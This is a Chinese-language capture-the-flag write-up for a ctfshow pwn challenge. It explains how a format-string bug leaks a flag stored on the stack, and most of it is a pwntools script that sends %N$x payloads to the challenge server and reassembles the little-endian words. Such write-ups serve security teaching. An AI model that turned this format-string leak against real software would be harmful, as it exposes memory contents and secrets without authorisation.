# 挑战简介
先找一下偏移

# 思路
```
  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(&v3, 64, stream);
```
看的出来，flag直接放栈上了  

可以直接用.%1$x来确定flag方位，可以发现是偏移为6的位置，由于是小端序，所以要进行反转，后面一个脚本顺水推舟就出来了  

```
from pwn import *

context(arch="i386", os='linux')
io = remote('pwn.challenge.ctf.show', 28149)

# 基于你的输出，我们知道flag从第6个参数开始
flag_parts = []

for i in range(6, 18):  # 读取足够的数据
    payload = f'%{i}$x'
    io.sendlineafter(b'$ ', payload.encode())
    response = io.recvline().strip()
    
    # 提取十六进制值
    hex_val = response.decode().strip()
    if len(hex_val) == 8:
        # 转换十六进制为字节并反转（小端序）
        try:
            bytes_data = bytes.fromhex(hex_val)[::-1]
            flag_parts.append(bytes_data)
            print(f"Offset {i}: {hex_val} -> {bytes_data}")
        except:
            pass

# 拼接所有部分
flag = b''.join(flag_parts)
print(f"\nComplete flag: {flag.decode('ascii', errors='ignore')}")

io.close()

```
